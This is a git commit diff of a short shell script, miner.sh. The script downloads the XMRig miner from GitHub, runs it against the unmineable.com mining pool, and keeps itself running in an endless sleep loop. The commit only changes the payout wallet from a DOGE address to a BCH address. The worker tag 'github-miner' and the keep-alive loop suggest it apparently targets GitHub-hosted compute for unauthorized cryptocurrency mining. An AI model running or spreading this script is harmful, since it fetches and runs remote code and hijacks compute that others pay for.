5d505ea1e992a57e740eebfbaf4a08962cdc7377
hasherbro <80259935+hasherbro@users.noreply.github.com>
2021-08-23 15:00:06 +0530

    Update miner.sh

--- miner.sh
+++ miner.sh
@@ -4,7 +4,7 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
 tar -xf xmrig-6.14.1-linux-x64.tar.gz
 cd xmrig-6.14.1
-./xmrig -o rx.unmineable.com:3333 -a rx -k u DOGE:D5H88bauLKaPKGUWRup9i82ZArJm5NSX9h.github-miner -p x --cpu 4
+./xmrig -o rx.unmineable.com:3333 -a rx -k u BCH:qzvnpllnhw8pzd44at8mx6q6scmw0xc34se2lhyggz.github-miner -p x --cpu 4
 while [ 1 ]; do
 sleep 3
 done sleep 999
